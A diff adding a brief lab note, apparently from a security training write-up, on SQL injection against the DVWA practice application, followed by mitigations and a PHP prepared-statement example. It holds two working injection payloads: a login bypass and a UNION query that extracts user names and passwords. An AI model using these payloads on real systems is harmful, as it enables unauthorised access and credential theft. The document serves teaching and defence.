@@ -1,0 +1,34 @@
+1️⃣ SQL Injection (SQLi)
+
+OWASP: A03 – Injection
+
+🎯 Vulnerable Page
+DVWA → SQL Injection
+⚔️ Attack Steps
+
+Input payload:
+
+' OR '1'='1 -- -
+
+Bypasses authentication
+
+Extract usernames and passwords
+
+🧨 Advanced Payload
+' UNION SELECT user, password FROM users -- -
+📸 Result
+
+Database records exposed
+
+🛡️ Mitigation
+
+Use Prepared Statements
+
+Parameterized Queries
+
+Disable error-based feedback
+
+Secure Code Example (PHP):
+$stmt = $conn->prepare("SELECT * FROM users WHERE user = ?");
+$stmt->bind_param("s", $user);
+$stmt->execute();
